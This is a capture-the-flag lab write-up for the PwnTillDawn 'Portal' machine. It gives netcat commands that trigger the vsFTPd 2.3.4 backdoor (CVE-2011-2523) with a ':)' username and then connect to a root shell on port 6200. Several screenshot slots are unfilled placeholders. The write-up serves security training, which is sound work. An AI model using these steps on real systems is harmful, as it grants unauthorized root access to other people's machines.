# Portal — PwnTillDawn

## Overview

This machine focuses on exploiting a vulnerable FTP service running an outdated version of **vsFTPd**.
The attack leverages a known backdoor vulnerability that provides remote root access to the target system.

---

# Reconnaissance

The first step was performing service enumeration using `nmap` to identify open ports, running services, and version information.

```bash id="6q1f8n"
nmap -sC -sV -O -p- 10.150.150.12
```

The scan revealed an FTP service running:

```text id="l8tq3m"
vsFTPd 2.3.4
```

This version is publicly known to be vulnerable to **CVE-2011-2523**, a malicious backdoor vulnerability that allows unauthorized remote shell access.

---

## Screenshot — Nmap Scan


<img width="497" height="328" alt="nmap_scan" src="https://github.com/user-attachments/assets/b25f5339-fd57-4af1-ad92-be7e365099e9" />



Example filename suggestion:

```text id="3nk7de"
screenshots/nmap_scan.png
```

---

# Exploitation

After confirming the vulnerable version, the next step was triggering the backdoor service.

Connect to the FTP service:

```bash id="v2mw0f"
nc 10.150.150.12 21
```

Send a username ending with the ASCII smiley `:)`.

Example:

```text id="7r9yxs"
USER anonymous:)
```

Any password can be entered afterward.

Once the payload is triggered, a shell becomes available on port `6200`.

Connect to it using:

```bash id="y5f1qd"
nc 10.150.150.12 6200
```

---

## Screenshot — Triggering the Backdoor

```text id="b0ke4w"
[ Insert FTP exploitation screenshot here ]
```

Example filename suggestion:

```text id="o9hj1v"
screenshots/ftp_backdoor_trigger.png
```

---

# Gaining Access

A successful connection to port `6200` returns a shell running as `root`.

Privilege level verification:

```bash id="j6e2zr"
whoami
id
```

The target immediately grants full administrative access.

---

## Screenshot — Root Shell Access

```text id="ap3h6d"
[ Insert root shell screenshot here ]
```

Example filename suggestion:

```text id="c8ut4n"
screenshots/root_shell.png
```

---

# Post-Exploitation

With root access obtained, the remaining task was to enumerate the system further and locate the flag.

Typical post-exploitation steps included:

* Navigating the filesystem
* Checking user directories
* Searching for flag files
* Performing basic system enumeration

---

## Screenshot — Flag Discovery

```text id="z7d1ko"
[ Insert flag screenshot here ]
```

Example filename suggestion:

```text id="f4gq8u"
screenshots/flag.png
```

---

# Vulnerability Details

| Category        | Details                  |
| --------------- | ------------------------ |
| Service         | vsFTPd                   |
| Version         | 2.3.4                    |
| CVE             | CVE-2011-2523            |
| Impact          | Remote Command Execution |
| Privilege Level | Root                     |

---

# Lessons Learned

* Version enumeration is critical during reconnaissance.
* Legacy services often contain publicly available exploits.
* Misconfigured or outdated FTP services can lead to complete system compromise.
* Simple vulnerabilities can still result in full administrative access if systems are not patched.

---

# References

* CVE-2011-2523
* vsFTPd 2.3.4 Backdoor Exploit
